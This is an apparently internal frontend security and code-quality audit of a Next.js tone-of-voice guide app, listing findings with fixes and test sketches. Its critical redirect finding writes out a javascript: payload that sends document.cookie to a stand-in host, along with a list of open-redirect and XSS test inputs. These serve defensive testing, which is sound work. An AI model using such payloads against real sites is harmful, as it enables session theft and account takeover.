# 03 – Frontend audit (client pages, hooks, app-level components)

Scope: `app/**` pages (not `app/api/**` routes, except `app/api/page.tsx` which is a *page*), `hooks/*`, `components/*.tsx`,
`components/dashboard/**`, `components/landing/**`, `components/editor/{GuideEditor.tsx,use-chat.ts,transforms.ts}`.
Read-only audit; no repo files edited. Scratch reproductions live in
`scratchpad/audit/fe/`.

**Baseline:** all line numbers refer to HEAD `e098063`. While this audit ran, the working tree was being changed
by someone else (186 entries in `git status`): several items below are already staged for deletion (`app/api/page.tsx`,
`GuideAccordion`, `GuideHeader`, `company-logos-section`, `editor-kit`, `hooks/use-{debounce,is-touch-device,mounted,upload-file}.ts`,
`lib/{markdown-joiner-transform,supabase,url-utils,uploadthing}.ts`), and untracked `lib/safe-redirect.ts` + `lib/tiers.ts`
(with tests) now exist. As of the last check, `safeRedirectPath` is **not yet used** by `app/sign-in`, `app/sign-up` or
`app/auth/callback` (`grep -rn safe-redirect app components` → nothing), and its default fallback is `"/dashboard"`
whereas these pages default to `"/auth/claim"`, so callers must pass the fallback. FE-1 therefore remains open.
(`hooks/use-debounce.ts`, `use-is-touch-device.ts`, `use-mounted.ts` were imported by `components/ui/*` files at HEAD; those
consumers are also gone in the working tree, and no remaining file imports them.)

**Test tooling note (correction to brief):** `@testing-library/react@16.3.3`, `@testing-library/jest-dom`,
`@testing-library/user-event` are already in `devDependencies` (package.json:143-145) and wired in `test/setup.ts`
(`jest-dom/vitest` + `cleanup`). `pnpm test` passes (1 file, 4 tests). Nothing needs to be added for the sketches below.

Severity counts: **critical 1 · high 1 · medium 9 · low 11** (22 findings) + 12 simplification/dead-code items.

---

## Findings

### FE-1 (critical) Unvalidated `redirectTo` / `next` → DOM XSS (`javascript:`) and open redirect after login
- `app/sign-in/page.tsx:17` `const redirectTo = searchParams.get("redirectTo") ?? "/auth/claim"` → `:43 router.push(redirectTo)`; also forwarded into OAuth `:62` and into the sign-up link `:147-151`.
- `app/sign-up/page.tsx:19` same; `:76 router.push(redirectTo)`; `:53` / `:99` forwarded as `next` to the callback.
- `app/auth/callback/route.ts:10,31` `NextResponse.redirect(\`${origin}${next}\`)` (route handler, but it is the end of the same param chain).
- **Verified behaviour (Next 16.1.6):** `router.push` resolves `new URL(addBasePath(href), location.href)`; for `javascript:alert(document.domain)`, `https://evil.com` and `//evil.com/x` `isExternalURL()` is `true`, and `app-router.js:202-209` then does `location.assign(canonicalUrl)` with no scheme check (reproduced in node). For the callback, `new URL("https://toneofvoice.app" + "@evil.com").host === "evil.com"` and `+ ".evil.com/x"` → `toneofvoice.app.evil.com`.
- **Failure scenario:** attacker mails `https://toneofvoice.app/sign-in?redirectTo=javascript:fetch('https://x.example/?c='+document.cookie)`. Victim signs in with password → script runs on the app origin; `@supabase/ssr` browser sessions live in JS-readable cookies → account takeover. Variant `?redirectTo=https://evil.example/login` gives a post-login phishing redirect. Email-confirm / Google flows: `next=@evil.example` redirects off-site from the server callback.
- **Fix:** add `lib/safe-redirect.ts` → `safeRedirectPath(raw, fallback = "/auth/claim")`: accept only strings that start with a single `/` (reject `//`, `/\`, `\`), parse with `new URL(raw, "https://internal.invalid")` and require that origin; return `pathname+search+hash`. Use it in sign-in, sign-up (both `router.push` and the `next` param) and `auth/callback` (build with `new URL(safe, origin)`).
- **Test (vitest, pure):**
  ```ts
  it.each(["https://evil.com","//evil.com","/\\evil.com","\\\\evil.com","javascript:alert(1)"," JaVaScRiPt:alert(1)","@evil.com",".evil.com","data:text/html,x"])(
    "rejects %s", (v) => expect(safeRedirectPath(v)).toBe("/auth/claim"))
  it("keeps internal path + query", () => expect(safeRedirectPath("/guide?guideId=a&subscribe=pro")).toBe("/guide?guideId=a&subscribe=pro"))
  it("null → fallback", () => expect(safeRedirectPath(null)).toBe("/auth/claim"))
  ```
  RTL: mock `next/navigation` (`useSearchParams` → `?redirectTo=javascript:…`, spy `push`) and `@/lib/supabase-browser` (`signInWithPassword` resolves `{error:null}`); submit form; `expect(push).toHaveBeenCalledWith("/auth/claim")`.

### FE-2 (high) Word/Markdown/zip exports silently delete user content and mangle headings
- `app/guide/page.tsx:1109-1156` `processFullAccessContent` (used by DOCX/MD at `:919, :958, :998`).
  - `:1127-1130` drops **every line** containing `"essential guide"` or `"clear and consistent"` (legacy subtitle filter; template no longer has that subtitle – only `app/demo/page.tsx:33` does).
  - `:1124-1125` drops the first line in the first 10 matching `^\w+\s+\d{1,2},\s+\d{4}` (any date sentence).
  - `:1132` drops every `---` line.
  - `:1113` calls `filterLockedSections`, which rebuilds **every** section as `## ${title}` (`:1101`) – an H1 becomes an H2, so the H1-removal at `:1116-1122` can never match (dead) and the title is exported as a bogus H2 section. Preamble text before the first heading is dropped (parser only emits text after headings).
- **Reproduced** (copied code run with jiti, `fe/pfa.ts`): input section "About Acme" with lines "We keep every message clear and consistent across channels." / "Read our essential guide to onboarding." / "March 3, 2025" → output `"## Acme Tone of Voice Guide\n\n\n## About Acme\n\n\n\n## Acme Brand Voice\n\n### 1. Bold\nBold text."` – all three body lines gone, H1 turned into H2.
- **Failure scenario:** a paying user writes "Keep every message clear and consistent" (a very common tone-guide sentence) and downloads Word/Markdown – the line is missing from the deliverable with no warning; the PDF (DOM-based) still has it, so formats disagree.
- **Fix:** extract to `lib/export-markdown.ts` (`filterLockedSections(md, isUnlocked)`, `prepareExportMarkdown(md, {brandName, isUnlocked})`), delete the phrase/date/`---` heuristics (or anchor them to the exact legacy subtitle line directly under a leading H1), preserve heading levels, keep preamble, and call the filter once (preview path calls it twice: `:918` then again inside `:1113`).
- **Test (pure):** keeps lines containing "clear and consistent"/"essential guide"; keeps date sentences inside sections; drops style-rules/examples/word-list for starter only; H1 not converted to H2; brand-voice rename idempotent (`## Brand Voice` → `## Acme Brand Voice`, already-branded unchanged); `###` traits numbered 1..n only inside Brand Voice and already-numbered titles untouched; empty input → `""`.

### FE-3 (medium) Editing reorders the guide and duplicates "Questions?" in edit mode
- `components/GuideView.tsx:96-103` builds `editorMarkdown` from unlocked sections (`buildEditableMarkdown` includes `contact`), and `:251-260` writes back `withoutTitle + "\n\n" + lockedMarkdown` – locked sections are appended at the end. `:287-301` additionally renders `questionsSection` below the editor, so in edit mode "Questions?" appears twice (once editable inside the editor, once read-only).
- **Reproduced** (`fe/order.ts`): template order `about > audience > how-to-use > brand-voice > style-rules > examples > word-list > ai-writing-cleanup > contact` becomes `… > brand-voice > ai-writing-cleanup > contact > style-rules > examples > word-list` after one unchanged edit round-trip for a starter user.
- **Failure scenario:** starter edits a typo → content persisted (localStorage, and DB for saved guides) with Style Rules/Before-After/Word List after "Questions?". After upgrading + expanding, DOCX/MD exports (content order) put "Questions?" in the middle of the document.
- **Fix:** extract `mergeEditedMarkdown({editorMd, sections, isUnlocked, brandName})` to lib that re-inserts locked sections at their original indices; do not render the separate questions block in edit mode (or exclude contact from the editor).
- **Test (pure):** round-trip of unchanged editor markdown returns content with identical section id order; edited body of an unlocked section is updated in place; locked sections preserved verbatim; leading `# Name` is stripped and reported as `brandName` only when changed. RTL: render `GuideView` with `viewMode="edit"` (mock `GuideEditor` to a stub) → `getAllByText("Questions?")` has length 1.

### FE-4 (medium) Autosave drops the last ≤2 s of edits on navigation; no request sequencing
- `app/guide/page.tsx:668-695`: debounced `setTimeout(…, 2000)` whose cleanup `clearTimeout(t)` runs on unmount → pending edits are discarded, never flushed (no `beforeunload`/`visibilitychange`/`keepalive`). Fallback copy goes to `localStorage.generatedStyleGuide` (`:1489`) which the guideId flow never reads back.
- No abort/sequence number: if save N takes >2 s, save N+1 can be in flight concurrently and an older body can land last.
- Every save hard-codes `plan_type: "style_guide"` (`:679`) regardless of the loaded `guideType` (`guideType` is in deps `:695` but unused in the body).
- **Failure scenario:** user edits a saved guide and clicks "Dashboard" (GuideLayout `:70-76`) within 2 s → last edits gone on reopen.
- **Fix:** `hooks/use-autosave.ts`: debounce + flush on unmount/pagehide via `fetch(…, {keepalive:true})`, AbortController for the previous request (or monotonically increasing revision checked server-side), send the real `guideType`, expose `status` for a "Saved/Saving…" indicator.
- **Test (renderHook + `vi.useFakeTimers()` + mocked `fetch`):** no call before 2 s; one call after; `unmount()` with pending change → fetch called once with `keepalive: true`; second change while first in flight → first `AbortSignal.aborted === true`; `hasEdits=false` → no call.

### FE-5 (medium) "Add section" changes are never persisted
- `hooks/use-guide.ts:196-211` `handleAddSection` only `setContent` + `setEditorKey`; it bypasses the page's `onContentChange` (`app/guide/page.tsx:1480-1494`), so `hasEdits` stays false (autosave effect `:669` returns early) and `localStorage.previewContent` is not updated.
- **Failure scenario:** user opens a saved guide, adds a custom section "Social media", leaves → section missing on reload. Preview flow: reload loses it too.
- **Fix:** have `useGuide` accept an `onContentChange` callback (or return the new markdown to the page) so all content mutations go through one path.
- **Test (renderHook):** `act(() => result.current.handleAddSection("Social"))` → spy `onContentChange` called with markdown containing `## Social` before `## Questions?`.

### FE-6 (medium) Subscription tier cached at module scope → paid users treated as "starter" on later visits
- `hooks/use-guide.ts:5-6` `const tierFetchedForUser = new Set<string>()`; `:116-131` skips the fetch when the user id is in the set. The set is cleared only when `user` becomes null. Component state starts at `"starter"` (`:96`) on every mount, so on the second and later mounts of `/guide` in the same SPA session no fetch happens and tier stays `"starter"`. Only the guideId flow re-sets the tier (`app/guide/page.tsx:211-251`).
- **Failure scenario:** Pro user (2 guides, at limit) uses the homepage hero (no limit check in `hooks/use-extraction.ts`) → `/guide?generate=preview` (2nd mount) → AutoSaveGuide save gets 403 (FE-7) so the page stays in preview flow with tier `"starter"`: pro sections locked, `onUpgrade` opens the "Subscribe" dialog (`:1399-1409`), and `app/api/create-subscription-session/route.ts:86-103` has no existing-subscription guard → a second subscription can be bought. Even on success there is a flash of locked sections until the redirect.
- **Fix:** remove the module cache; fetch per mount (or put `tier` in `AuthProvider` context, refreshed on auth change and after checkout). Use the `subscription_tier` already returned by `/api/load-style-guide` instead of the extra fetch in the page (3 tier sources today: `use-guide.ts:127`, `page.tsx:213`, `load-style-guide` response).
- **Test (renderHook, mock `useAuth` → `{user:{id:"u1"}}`, `fetch` → `{subscription_tier:"pro"}`):** mount → wait tier "pro"; `unmount()`; mount again → `fetch` called twice and tier "pro".

### FE-7 (medium) Logged-in users at their guide limit get a silent, endlessly retried save failure
- `hooks/use-extraction.ts:340-488` (homepage hero) has no guide-limit check (contrast `components/dashboard/NewGuideButton.tsx:178` which shows `UpgradeNudgeModal`). `components/dashboard/AutoSaveGuide.tsx:51-63`: non-401 failures only `console.warn` and return; `previewContent` is not cleared, so every later mount of `/guide` or `/dashboard` POSTs again and fails again.
- **Failure scenario:** starter with 1 guide generates a new one from the homepage; it looks fine on `/guide` but is never saved and the user is never told; next dashboard visit shows only the old guide.
- **Fix:** on 403 show the upgrade nudge/toast and mark the draft as "unsaved – limit reached"; check limit before generation for logged-in users (shared helper with NewGuideButton).
- **Test (RTL):** render `<AutoSaveGuide/>` with mocked `useAuth` (user) and fetch → 403; seed localStorage; assert toast/nudge rendered (via mocked `useToast`) and fetch called once.

### FE-8 (medium) Previous brand's voice traits reused for a new brand
- `hooks/use-extraction.ts:449-465` and duplicate `components/CreateGuideModal.tsx:247-257` only write `selectedTraits` when `suggestedTraits.slice(0,3).length > 0`. `app/api/extract-website/route.ts:169-186` / `342-357` return `suggestedTraits: []` whenever trait generation throws or returns non-JSON.
- **Failure scenario:** user generated "Acme" (traits Bold/Witty/Warm), then extracts "Globex" and trait generation fails → `/guide` sends Acme's traits for Globex (`app/guide/page.tsx:413-434`).
- **Fix:** in one shared `persistExtraction()` always `removeItem("selectedTraits")` (and `brandKeywords`) before writing new values.
- **Test (pure, jsdom localStorage):** seed `selectedTraits`; `persistExtraction({success:true, suggestedTraits:[]})` → `localStorage.getItem("selectedTraits") === null`.

### FE-9 (medium) Guide drafts in localStorage leak across accounts on a shared browser
- Neither sign-out clears app storage: `components/UserMenu.tsx:25-29` (`signOut()` + `router.push('/')`) and `components/AuthProvider.tsx:93-97`. `app/auth/claim/page.tsx:31-55` saves whatever `brandDetails` + `previewContent` are present into the **currently** signed-in account; `components/dashboard/AutoSaveGuide.tsx:25-49` does the same on `/dashboard` and `/guide`.
- Also `app/guide/page.tsx:1489` writes the full content of the last edited saved guide to `localStorage.generatedStyleGuide` on every keystroke; it survives logout.
- **Failure scenario:** anonymous visitor A generates a preview on a shared/office computer and leaves; B later signs in (default redirect `/auth/claim`) → A's brand + guide is created in B's account. After B logs out, B's latest guide text remains in localStorage.
- **Fix:** single `signOut` (AuthProvider) that clears a documented key list (`brandDetails, previewContent, generatedStyleGuide, selectedTraits, suggestedTraits, brandKeywords, emailCapture, savedGuideId, guide-edits-*`); stop writing `generatedStyleGuide` for the guideId flow; optionally stamp drafts with a creation time and ignore stale ones in claim.
- **Test (RTL):** render `UserMenu` with mocked supabase; click "Log out"; assert listed keys removed.

### FE-10 (medium) `/payment/success` (legacy) fires purchase conversions and an unauthenticated full generation on every visit
- `app/payment/success/page.tsx:247-280`: on mount always fires Google Ads conversion (`:256`), Mixpanel "Payment Completed" (`:276`), writes `styleGuidePaymentStatus=completed`, and calls `/api/generate-styleguide` (`:142`). The `session_id` check is commented out (`:261-270`). Nothing in the app creates a checkout that lands here any more (`grep create-checkout-session` → only the route itself; subscriptions use `success_url /dashboard?subscription=success`).
- **Failure scenario:** any visit/crawl/refresh of `/payment/success` with a brand in localStorage burns a full LLM generation and records a fake paid conversion in Ads/Mixpanel.
- **Fix:** delete `app/payment/success`, `app/payment/cancel`, `app/api/create-checkout-session` (see SIMP-1).
- **Test:** none needed after deletion; optional route test that `/payment/success` 404s / redirects.

### FE-11 (medium) Floating-toolbar "Turn into → list" produces invisible indent-lists that export as Markdown lists
- `components/editor/transforms.ts:66-81` (`setList`) and `:14-21` (`insertList`) create indent-list paragraphs (`indent`, `listStyleType`); keys are `KEYS.ul === "disc"`, `KEYS.ol === "decimal"` (verified). `components/editor/GuideEditor.tsx:151-159` loads only **list-classic** plugins (types `ul`/`ol`/`li`/`lic`) and no indent-list/Indent plugin. `getBlockType` (`:132-141`) returns `"ul"` for classic lists, which never matches the menu values.
- **Reproduced** (`fe/plate-list.cjs`, NODE_PATH to repo): after `setNodes(create.block({indent:1, listStyleType:'disc'}))` the node is `{"type":"p",…,"indent":1,"listStyleType":"disc"}` and `serialize()` → `"* hello\n"`.
- **Failure scenario:** user selects a paragraph → Turn into → Bulleted list: nothing changes visually, but the saved/exported markdown becomes a bullet; the dropdown never shows the current list type.
- **Fix:** in `transforms.ts` map list items to `editor.tf.bulleted_list.toggle()` / `numbered_list.toggle()` (classic), and make `getBlockType` return the classic type; or switch the editor to indent lists consistently.
- **Test (vitest, node env via `createSlateEditor` + MarkdownPlugin + list-classic base plugins):** `setBlockType(editor, "ul")` then `editor.children[0].type === "ul"` and serialize equals `"* hello\n"`.

### FE-12 (low) Opening `/brand-details` wipes the pending preview
- `app/brand-details/page.tsx:238-246`: the "keywords changed" effect runs on mount (initial `[]`) and removes `previewContent`, `generatedPreviewTraits`, `previewTraitsTimestamp`.
- **Failure scenario:** anonymous user generates a preview, visits `/brand-details` (sitemap entry), then signs up → `/auth/claim` finds no `previewContent` and saves nothing; returning to `/guide` triggers a new paid `/api/preview` call. (Low: page has no in-app links, see SIMP-2.)
- **Fix:** skip the first run (ref) or clear only inside `addKeyword/removeKeyword`.
- **Test (RTL):** seed `previewContent`; render page (mock `useAuth`, `useRouter`, `useSearchParams`); assert key still present.

### FE-13 (low) Root layout overrides per-page SEO
- `app/layout.tsx:92-96` hard-codes `<title>`, description and `<link rel="canonical" href="https://toneofvoice.app">` for every route, alongside the `metadata` export (`:13-72`), which also ships the placeholder `verification.google: 'google-site-verification-code-here'` (`:69-71`).
- **Failure scenario:** `/example` sets its own metadata (`app/example/page.tsx:10-15`, comment says it handles canonical) but every page emits canonical → homepage, so search engines fold `/example` into `/`; pages get duplicate `<title>` elements.
- **Fix:** delete the manual tags; use `metadata.alternates.canonical` per page; remove the placeholder verification.
- **Test:** `renderToString` not practical for layouts; assert via Playwright later, or unit-test `metadata` objects (`expect(exampleMetadata.alternates?.canonical).toBe("/example")`).

### FE-14 (low) Public "API test page" shipped at `/api`
- `app/api/page.tsx` (316 lines, `"use client"`, `ApiTestPage`) offers UI to call `/api/extract-website` and `/api/generate-styleguide` (`:66, :130`). No links to it. robots.txt only disallows crawling.
- **Fix:** delete (dev tooling belongs in `scripts/`).

### FE-15 (low) Long generations are never aborted; dev double-calls; PDF fallback skipped
- `app/guide/page.tsx:431-435` `/api/preview` fetch has no `AbortController`; cleanup (`:503-506`) only flips `isMounted`, so navigating away still pays for the generation.
- `:126-130` "reset load guard" effect runs on every mount and deletes `guideLoadGuard.loading` for the current id, so in React Strict Mode (`next.config.js:3 reactStrictMode: true`) the module-level guard (`:5-6`, comment "survives Strict Mode") is defeated and the guide is fetched twice in dev.
- `:860-861` `exportPdfWithFallback` throws if `/pdf-styles` fails, before the html2pdf fallback is attempted.
- **Fix:** AbortController in the preview hook (abort in cleanup); delete the module guard + reset effect and rely on an abortable effect; wrap the CSS fetch inside the try that falls back.
- **Test (renderHook, fake fetch honoring `signal`):** unmount during generation → `signal.aborted === true`.

### FE-16 (low) Link insertion bypasses URL validation
- `components/editor/GuideEditor.tsx:267-275` `window.prompt` → `insertNodes({type:"a", url, …})` with no validation (bypasses LinkPlugin's upsert/validate path); `javascript:`/`data:` URLs are stored in the guide and exported to Markdown/DOCX. Preview rendering via `react-markdown` sanitises URLs, so impact is limited to stored/exported content (self-inflicted), plus `window.prompt` is not accessible.
- **Fix:** use Plate's link toolbar/`upsertLink` (validated) or check `/^(https?:|mailto:)/i` before inserting.
- **Test:** unit-test a `isSafeLinkUrl()` helper.

### FE-17 (low) Clear-cut accessibility defects
- `components/GuideLayout.tsx:70-76`: "Dashboard" link text is `hidden sm:inline`; below `sm` the link contains only an unlabeled SVG → no accessible name. Fix: `aria-label="Dashboard"`.
- `app/brand-details/page.tsx:832-846`: "Advanced options" disclosure button lacks `aria-expanded`/`aria-controls`.
- `app/global-error.tsx:13` `<html>` without `lang`; copy says "We've been notified" but nothing reports the error (`error` prop unused, TS6133).
- `app/sign-in/page.tsx:110-128`, `app/sign-up/page.tsx` inputs have no `<label>`/`aria-label` (placeholder only).
- **Test (RTL):** `getByRole("link", {name: /dashboard/i})` on GuideLayout; `getByRole("button",{name:/advanced options/i})` has `aria-expanded="false"` then `"true"` after click; `getByLabelText(/email/i)` on sign-in.

### FE-18 (low) Brand-name input destroys legitimate names
- `app/brand-details/page.tsx:320` `value.replace(/[^a-zA-Z0-9\s-]/g, "")` → "Ben & Jerry's" becomes "Ben  Jerrys", "Café Noir" → "Caf Noir", "L'Oréal" → "LOral"; keywords `:411` likewise ASCII-only (extracted non-ASCII keywords are silently dropped on load `:184-187`).
- **Fix:** allow Unicode letters/punctuation (`/[\p{L}\p{N}\s&'’.\-]/u`), just trim/limit length.
- **Test (pure, after extracting `normalizeBrandName`):** preserves `&`, `'`, accents; trims to 50.

### FE-19 (low) Session replay records guide content unmasked
- `components/MixpanelProvider.tsx:140-155`: `record_sessions_percent: 100`, `record_mask_all_text: false`, `record_mask_all_inputs: false` → brand descriptions (brand-details textarea, hero textarea), editor content and names typed into sign-up are captured in replays sent to Mixpanel. Privacy/compliance item; also logs config to console in production (`:158-163`).
- **Fix:** keep masking on and opt-in un-mask specific marketing elements, or add `mp-mask` classes on the editor/inputs; drop the console log.

### FE-20 (low) Preview-flow brand rename is not persisted
- `app/guide/page.tsx:1496` `onBrandNameChange={(name) => setBrandDetails({...brandDetails, name})}` – in the preview flow nothing writes `localStorage.brandDetails`; after reload the old name returns and `AutoSaveGuide`/`/auth/claim` save the guide under the old title. Each keystroke in the H1 also re-runs the preview-load effect (`:379-507`, deps `[brandDetails…]`), re-reading/writing localStorage.
- **Fix:** persist through one `updateBrandDetails` helper; remove `brandDetails` object from that effect's deps (depend on a stable flag).

### FE-21 (low) Inconsistent password policy
- `app/sign-up/page.tsx:40` min 8 chars vs `app/reset-password/page.tsx:45` min 6.
- **Fix/test:** shared `validatePassword()` in lib; unit test both pages use it.

### FE-22 (low) tsc baseline errors in scope (4 files, 7 errors)
- `components/landing/hero-section.tsx:120` TS1345 – `track(…) || mpTrack(…)` on a `void`; replace with two statements.
- `components/MarkdownRenderer.tsx:50` TS2571 – React 19 `props` is `unknown`; cast `(children as React.ReactElement<{children?: React.ReactNode}>)`.
- `components/editor/use-chat.ts:32` TS2322 – `onData` param type; type it as `DataUIPart<…>` from `ai`.
- `hooks/use-upload-file.ts:7,9,24,42` – imports uninstalled `uploadthing`/`@uploadthing/react`; file is dead (SIMP-3) – delete (also removes `lib/uploadthing.ts` 3 errors).
- `next.config.js:12-14` `typescript.ignoreBuildErrors: true` hides these from builds.

---

## Simplifications and dead code

### SIMP-1 Remove the legacy one-time-payment "full-access" flow (~450 lines)
Evidence: `grep -rn "create-checkout-session"` → only `app/api/create-checkout-session/route.ts` (no client caller). Its `success_url`/`cancel_url` are the only producers of `/payment/success` and `/payment/cancel`. `"/guide?generated=true"` is produced only by `app/payment/success/page.tsx:192`. `subscription=success` is only produced for `/dashboard` (`create-subscription-session/route.ts:96`).
Dead in `app/guide/page.tsx`: `alreadyGenerated` branch `:312-347`, `generateStyleGuide` `:510-665`, `handleRetry` `:1194-1204`, `apiError`/`isRetrying`/`contentUpdated` state and both `ErrorMessage` blocks `:1319-1339, :1774-1784` (the first is also unreachable: the loading guard at `:1224` returns first whenever `!content`), regenerate dialog `:1652-1678` (`setShowRegenerateConfirm(true)` never called), `subscriptionSuccess` retry loop `:254-266`, `savedToAccount` (written, never read – TS6133), `handleDownload` non-PDF branch `:916-937` (only call site `:1349` passes `"pdf"`). Also the `## Brand Voice([\s\S]*?)(?=##|$)` capture (`:395, :469`) stops at the first `###` and only feeds the dead flow.
Write-only/dead localStorage keys: `styleGuidePaymentStatus`, `styleGuidePlan`, `generatedPreviewTraits`, `previewTraitsTimestamp`, `emailCaptureToken`, `savedGuideId` (only read in dead success page), `guide-edits-*` (`GuideEditor.tsx:252-258`, never read – `grep "guide-edits-"`).

### SIMP-2 Dead / orphaned pages
- `/demo` (`app/demo/page.tsx`, 287 lines static Nike page): no links, not in `public/sitemap.xml`.
- `/preview`, `/full-access`: client-side redirect shims to `/guide` with no inbound links (`grep "/full-access"` → only a comment in `GuideView.tsx:60`); replace with `redirects()` in `next.config.js` if old links must keep working.
- `app/api/page.tsx` (FE-14).
- `/brand-details` (1008 lines): only reachable via sitemap; nothing links to it (`grep -rn "brand-details" app components hooks lib` → only the page itself). Inside it, dead code per `tsc --noUnusedLocals`: `estimateTokens`, `handleEmailChange`, `handleEmailBlur` (email-capture UI no longer rendered; `showEmailCapture` toggled but never read in JSX), `sessionToken`/`emailCaptureToken` (consumer was create-checkout-session), `validateNameField`/`validateMainField` (return values ignored), `fromExtraction`/`audience` query params (no producer). Decide: delete page or link it; if kept, extract validators to lib.

### SIMP-3 Dead modules (no importers; verified by grep for module basename across app/components/hooks/lib/scripts/middleware)
`components/GuideAccordion.tsx` (also contains `dangerouslySetInnerHTML` with raw markdown/titles – remove the sink), `components/GuideHeader.tsx`, `components/company-logos-section.tsx`, `components/editor/editor-kit.tsx` → only importer chain of `plugins/media-kit.tsx` → `ui/media-placeholder-node.tsx` → `hooks/use-upload-file.ts` (uninstalled deps), `lib/markdown-joiner-transform.ts`, `lib/supabase.ts`, `lib/url-utils.ts`. `components/ui/use-toast.ts` is byte-identical to `hooks/use-toast.ts` (`diff -q` silent) and unused; `sonner` `Toaster` is never mounted, so `toast` from `sonner` (use-upload-file, media toolbar) can never display.

### SIMP-4 Unused props/imports (from `tsc --noUnusedLocals --noUnusedParameters`, 57 hits in scope)
`GuideView` ignores `activeSectionId, onModeSwitch, content, isSectionLocked, showEditTools` and imports `useEffect,useState,Eye,PenLine`; `MarkdownRenderer` ignores `selectedTraits` → `GuideView.tsx:105-112` parses `localStorage.selectedTraits` on every render for nothing (and threads it through `ContentGate`); `PostExportPrompt` ignores `content`; `GuideCover`/`GuideHeader` ignore `guideType`; `GuideCard` ignores `planType`; `UpgradeNudgeModal` ignores `used/limit`; `BillingPlansGrid` ignores `used/limit/nextBilling` (so `billing/page.tsx:26-36` count/limit/date queries are wasted); `useGuide` ignores `guideId, isPreviewFlow` and creates unused `router, searchParams, authLoading, toast`; `app/dashboard/page.tsx` unused `Link, Button, Plus` and selects `guides_limit` but hard-codes limits.

### SIMP-5 Guide limits / tier normalisation duplicated and inconsistent
`tier === "starter" ? N : tier === "pro" ? 2 : 99` in `app/dashboard/page.tsx:42` (starter 1), `app/dashboard/billing/page.tsx:32` (starter 0), `app/api/user-guide-limit/route.ts:22` (starter 0 → `atLimit` never true for starter), `app/api/save-style-guide/route.ts:74` (starter 1, the enforced one). `=== "free" ? "starter"` normalisation appears 9 times (5 API routes, guide page, dashboard, billing, use-guide). → `lib/tiers.ts` with `normalizeTier()` and `getGuideLimit()`; test: `normalizeTier("free"|null|undefined) === "starter"`, limits starter=1/pro=2/agency=Infinity, `isAtLimit(used, tier)`.

### SIMP-6 Split `app/guide/page.tsx` (1795 lines) after SIMP-1
Proposed: `hooks/use-guide-loader.ts` (guideId load; use tier from load response), `hooks/use-preview-generation.ts` (abortable, FE-15), `hooks/use-autosave.ts` (FE-4), `hooks/use-guide-export.ts` (pdf/docx/md/zip; uses `lib/export-markdown.ts` + existing `downloadFile` in `lib/file-generator.ts:355` instead of the 4 inline createObjectURL copies at `:875, :924, :963, :1053`; one `prepareExportClone(el)` for the 3 copies of the locked/pdf-only/pdf-exclude clone prep at `:903-906, :1018-1022, :1166-1169`; one `guideSlug()` for the 5 filename variants at `:907, :927, :966, :999, :1170` – `:907/927/966/999` throw if `brandDetails.name` is missing), `hooks/use-checkout.ts` (3 copies of the create-subscription-session call: `page.tsx:150`, `:707`, `BillingActions.tsx:53`), components `GenerationProgress` (`:1240-1315`), `PaymentDialog`, `ExportGateDialog`, `DownloadOptionsDialog`, `ExpandBanner`, `GuideTip`. Placeholder detection duplicated at `:740-744` and `:775-778` (and in `app/api/expand-style-guide/route.ts:46-48,78-80`) → `lib/guide-placeholders.ts hasUnlockPlaceholders()`.

### SIMP-7 Unify extraction logic
`components/CreateGuideModal.tsx:76-264` duplicates `hooks/use-extraction.ts` (getEffectiveInput, isInputValid, input validation, fetch, brandDetails construction, localStorage writes, loading words) with a **different** `classifyError` (`CreateGuideModal.tsx:95-155` vs `use-extraction.ts:12-218`), so the same failure yields different messages in hero vs modal. Extract `lib/extraction.ts` (`buildBrandDetailsFromExtraction`, `persistExtraction`, `classifyExtractionError`) and reuse `useExtraction` in the modal. Also remove ~20 `console.log` lines (`[HOMEPAGE]`, `[PERFORMANCE]`, user input logged at `:353-358, :513-521`).

### SIMP-8 Duplicate save-style-guide clients and sign-out paths
`/api/save-style-guide` is POSTed from 5 places (`auth/claim:44`, `AutoSaveGuide:39`, `guide/page:617`, `:671`, `payment/success:162`), each building `{title: \`${name} Style Guide\`, brand_name, content_md, plan_type, brand_details}` by hand → `lib/guides-client.ts saveGuide()`. Claim page and AutoSaveGuide implement the same "claim pending draft" logic twice. Two sign-out implementations (`UserMenu.handleLogout`, `AuthProvider.signOut`).

### SIMP-9 Duplicate scroll-spy
`app/example/ExampleGuideClient.tsx:37-73` copies `useGuide`'s `handleSectionSelect` and IntersectionObserver (`hooks/use-guide.ts:134-167`) → `hooks/use-scroll-spy.ts`. `useGuide`'s observer also re-subscribes on every keystroke because `sections` is re-parsed per content change.

### SIMP-10 Unnecessary `"use client"` and client-only rendering
`app/page.tsx:1` makes the whole landing page a client component only to use `dynamic(..., {ssr:false})` for `components/testimonials-section.tsx`, which is static (no hooks) – testimonials are therefore missing from SSR HTML. `components/landing/{comparison,faq,how-it-works,whats-included}-section.tsx` and `components/Footer.tsx` are `"use client"` with no hooks/handlers. `GuideView` statically imports `GuideEditor` (Plate + AI kits) so read-only `/example` ships the editor; load it with `next/dynamic` only in edit mode.

### SIMP-11 Per-keystroke work in the editor path
Each keystroke: Plate serialises the whole doc (`GuideEditor.tsx:247`), writes it to `localStorage guide-edits-*` (dead), the page writes it again to `previewContent/generatedStyleGuide` (`page.tsx:1484-1490`), `useGuide` re-parses sections and rebuilds the IntersectionObserver. Debounce `onChange` (prop comment at `GuideEditor.tsx:82` already claims "debounced") and drop the dead write.

### SIMP-12 Misc
`components/MetaPixelPurchase.tsx` no longer fires Purchase (only CompleteRegistration) – rename; its `useSearchParams` is kept only to "satisfy Suspense". `hooks/use-is-touch-device.ts:12-13` checks `navigator.maxTouchPoints > 0` twice. `app/guide/page.tsx:1529` hard-codes "© 2025". Hard-coded prices in the payment dialog (`page.tsx:1605, :1620`) duplicate `PRICING_TIERS` in `lib/landing-data.tsx:142,164`.

---

## Pure logic to extract (TDD targets) and behaviours to assert

| New module | Source | Behaviours |
|---|---|---|
| `lib/safe-redirect.ts` | sign-in:17, sign-up:19, auth/callback:10 | FE-1 table above; preserves query/hash; null/empty → fallback; output always same-origin path |
| `lib/export-markdown.ts` | guide/page.tsx:1084-1156 | FE-2 list; starter vs pro vs agency section filtering; idempotent; preamble kept |
| `lib/editor-merge.ts` | GuideView.tsx:96-103, 251-260 | FE-3: order preserved, contact once, H1 → brandName change detection, empty H1 ignored |
| `lib/guide-placeholders.ts` | guide/page.tsx:740-744, 775-778 | each of 3 placeholders detected; clean content false; `showExpandBanner(tier, guideId, isPreview, content)` truth table |
| `lib/tiers.ts` | 9 normalisations, 4 limit tables, use-guide:185-190 `isUnlocked` | `normalizeTier`, `getGuideLimit`, `isAtLimit`, `isUnlocked(minTier, tier)` matrix (starter/pro/agency × minTier) |
